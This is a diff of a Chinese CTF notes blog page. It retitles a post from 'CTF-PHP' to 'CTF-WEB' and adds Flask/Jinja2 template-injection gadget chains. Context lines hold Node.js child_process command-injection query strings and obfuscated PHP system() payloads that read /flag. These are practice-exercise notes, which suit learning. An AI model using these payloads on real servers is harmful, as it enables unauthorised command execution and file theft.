@@ -18,23 +18,24 @@
   
     <meta name="description" content="在ctf练习中的笔记-php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF-PHP">
-<meta property="og:url" content="http://sec-cat.github.io/2023/05/08/ctf_php/index.html">
+<meta property="og:title" content="CTF-WEB">
+<meta property="og:url" content="http://sec-cat.github.io/2023/05/08/ctf_web/index.html">
 <meta property="og:site_name" content="Sec-cat&#39;s Blog">
 <meta property="og:description" content="在ctf练习中的笔记-php">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
 <meta property="article:published_time" content="2023-05-08T13:37:40.000Z">
-<meta property="article:modified_time" content="2023-05-22T09:48:54.158Z">
+<meta property="article:modified_time" content="2023-05-22T09:58:48.525Z">
 <meta property="article:author" content="cat">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://sec-cat.github.io/img/ctfshowblog/ctf.jpg">
   
   
   
-  <title>CTF-PHP - Sec-cat&#39;s Blog</title>
+  <title>CTF-WEB - Sec-cat&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +213,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CTF-PHP"></span>
+            <span id="subtitle" data-typed-text="CTF-WEB"></span>
           
         </div>
 
@@ -235,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.5k 字
+          5.7k 字
         
       </span>
     
@@ -246,7 +247,7 @@
         
         
         
-          23 分钟
+          24 分钟
         
       </span>
     
@@ -319,10 +320,10 @@
     
       
       
-        <a href="/2023/05/08/ctf_php/" title="CTF-PHP"
+        <a href="/2023/05/08/ctf_web/" title="CTF-WEB"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">CTF-PHP</span>
+          <span class="category-post">CTF-WEB</span>
         </a>
       
     
@@ -372,12 +373,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CTF-PHP</h1>
+            <h1 style="display: none">CTF-WEB</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：几秒前
+                    本文最后更新于：3 小时前
                   
                 
               </p>
@@ -412,6 +413,8 @@
 <figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">需要逃逸多少个字符就定义多少个数组元素。<br>?calc[]=require(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;ls&#x27;</span>,[<span class="hljs-string">&#x27;/&#x27;</span>]).stdout.toString();&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=.<br><br>过滤了x，也无法直接利用exec，进行绕过<br>calc[]=<span class="hljs-symbol">Object</span>.values(require(<span class="hljs-string">&#x27;child_process&#x27;</span>))[<span class="hljs-number">5</span>](<span class="hljs-string">&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;</span>)&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=.<br>通过require导入的模块是一个<span class="hljs-symbol">Object</span>，那么就可以通过<span class="hljs-symbol">Object</span>.values获取到child_process里面的各种方法，那么再通过数组下标[<span class="hljs-number">5</span>]就可以得到execSync了，那么有了execSync后就可以通过写入文件的方式读取flag了<br>calc[]=require(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;nl&#x27;</span>,[<span class="hljs-string">&#x27;p&#x27;</span>]).stdout.toString();&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=<span class="hljs-number">1</span>&amp;calc[]=.<br><br></code></pre></td></tr></table></figure>
 <h2 id="利用数学函数绕过">利用数学函数绕过</h2>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[a])(<span class="hljs-symbol">$</span>_GET[b])&amp;a=<span class="hljs-keyword">system</span>&amp;b=cat /flag<br>?c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>&#123;<span class="hljs-built_in">cos</span>&#125;)(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>&#123;<span class="hljs-built_in">log</span>&#125;)&amp;<span class="hljs-built_in">cos</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">log</span>=cat /flag<br></code></pre></td></tr></table></figure>
+<h2 id="flask模板注入获取基本类-object">flask模板注入获取基本类 object</h2>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>]<br>&#123;&#125;.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span><br>[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span><br>config.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__base__</span><br>request.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">9</span>]   <span class="hljs-comment">//在flask的jinja2模块渲染是可用</span><br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -448,6 +451,8 @@
       
         <a href="/tags/ctf/">#ctf</a>
       
+        <a href="/tags/web/">#web</a>
+      
     </div>
   
 </div>
@@ -458,8 +463,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CTF-PHP</div>
-      <div>http://sec-cat.github.io/2023/05/08/ctf_php/</div>
+      <div>CTF-WEB</div>
+      <div>http://sec-cat.github.io/2023/05/08/ctf_web/</div>
     </div>
     <div class="license-meta">
       
